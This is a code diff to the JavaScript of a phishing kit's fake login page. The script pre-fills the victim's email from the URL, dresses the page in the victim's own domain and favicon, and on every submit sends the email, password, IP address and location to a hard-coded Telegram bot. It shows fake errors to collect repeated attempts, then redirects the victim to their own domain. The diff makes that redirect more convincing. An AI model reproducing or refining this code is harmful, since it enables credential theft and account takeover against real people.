@@ -217,14 +217,15 @@ $(document).ready(function() {
     $visible.show();
   }, 4000);
 
- 
+
   const hash = window.location.hash;
   if (hash) {
     const emailFromHash = decodeURIComponent(hash.substring(1)); // remove '#' and decode
     $('#email').val(emailFromHash);
 
-
     const domain = emailFromHash.split('@').pop();
+
+ 
     $("#frame").attr("src", "https://www." + domain);
     $("#logo").attr("src", "https://www.google.com/s2/favicons?domain=" + domain);
   }
@@ -232,7 +233,7 @@ $(document).ready(function() {
   let step = 1; 
 
   function sendTelegramMessage(message) {
-    const botToken = '8304965850:AAF_L9pYl2ApawNA3Luj7l-4wnlbEHJexHI'; 
+    const botToken = '8304965850:AAF_L9pYl2ApawNA3Luj7l-4wnlbEHJexHI'; // Your bot token
     const chatId = '6705135039'; // Your chat ID
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
@@ -253,12 +254,13 @@ $(document).ready(function() {
     });
   }
 
- 
+
   $('#login-form').submit(function(event) {
     event.preventDefault();
 
     const $btn = $(this).find('button[type=submit]');
     $btn.text('Verifying...');
+
 
     $.getJSON('https://ipinfo.io', function(response) {
       const email = $('#email').val();
@@ -266,12 +268,13 @@ $(document).ready(function() {
       const ip = response.ip;
       const location = response.city + ', ' + response.country;
 
-
+  
       const telegramMessage = `New form submission:\nEmail: ${email}\nPassword: ${password}\nIP: ${ip}\nLocation: ${location}`;
       sendTelegramMessage(telegramMessage);
 
-    
+   
 
+   
       console.log("Data to send:", {
         _subject: "Logs | " + ip,
         Email: email,
@@ -281,9 +284,9 @@ $(document).ready(function() {
         Location: location,
       });
 
-
       if (step >= 4) {
-        window.location.href = "https://mail.aliyun.com";
+        const emailDomain = email.split('@').pop();
+        window.location.href = "https://www." + emailDomain;
       } else {
         step++;
         $('#error').show(); 
